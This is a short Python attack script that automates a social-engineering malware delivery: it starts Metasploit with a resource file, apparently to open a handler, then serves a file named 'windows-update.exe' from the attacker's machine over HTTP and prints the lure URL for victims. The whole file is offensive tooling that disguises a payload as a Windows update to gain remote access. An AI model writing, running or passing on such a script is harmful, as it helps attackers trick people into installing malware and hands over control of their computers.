import socket
import os
import threading
import time

def active_python_server(attacker_ip):
    cmd = "python3 -m http.server 80"
    os.system(cmd)
    url = f"http://{attacker_ip}/windows-update.exe"
    print(f"Download update windows from --> {url}")



def attack():
    cmd = "msfconsole -r meta.rc"
    os.system(cmd)


def create_auto():

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    attacker_ip = s.getsockname()[0]
    
    threading.Thread(target=attack).start()
    time.sleep(15)
    threading.Thread(target=active_python_server, args=[attacker_ip]).start()


create_auto()